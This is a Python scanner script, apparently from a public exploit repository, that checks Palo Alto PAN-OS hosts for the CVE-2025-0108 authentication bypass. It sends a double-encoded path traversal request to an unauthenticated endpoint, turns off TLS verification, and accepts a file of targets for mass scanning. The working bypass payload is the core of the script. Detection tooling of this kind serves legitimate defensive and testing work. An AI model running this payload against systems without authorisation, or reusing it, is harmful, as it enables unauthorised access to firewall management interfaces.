# Author : laet4x
# Description : Detects an authentication bypass vulnerability in Palo Alto PAN-OS (CVE-2025-0108).

import requests
import urllib3
from urllib.parse import urljoin, quote
import argparse
import ssl

# Disable SSL warnings and enforce an unverified SSL context
ssl._create_default_https_context = ssl._create_unverified_context
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def check_cve_2025_0108(base_url):
    # Ensure the URL has a scheme (http or https)
    if not base_url.startswith("http://") and not base_url.startswith("https://"):
        base_url = "https://" + base_url

    url = f"{base_url}/unauth/%252e%252e/php/ztp_gate.php/PAN_help/x.css"
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36"
    }

    try:
        session = requests.Session()
        session.verify = False  # Disable SSL verification
        response = session.get(url, headers=headers, timeout=10)

        # Check if response contains the expected keyword and has a 200 status code
        if response.status_code == 200 and "Zero Touch Provisioning" in response.text:
            print(f"[+] Vulnerable to CVE-2025-0108: {base_url}")
        else:
            print(f"[-] Not vulnerable: {base_url}")
    except requests.exceptions.ConnectionError:
        print(f"[!] Connection refused: {base_url}")
    except requests.RequestException as e:
        print(f"[!] Error checking {base_url}: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CVE-2025-0108 Scanner")
    parser.add_argument("--url", help="Single target URL to check")
    parser.add_argument("--file", help="File containing multiple target URLs")
    args = parser.parse_args()

    if args.url:
        check_cve_2025_0108(args.url)
    elif args.file:
        try:
            with open(args.file, "r") as f:
                urls = [line.strip() for line in f if line.strip()]
            for url in urls:
                check_cve_2025_0108(url)
        except FileNotFoundError:
            print(f"[!] Error: File {args.file} not found.")
    else:
        print("[!] Please provide either --url or --file option.")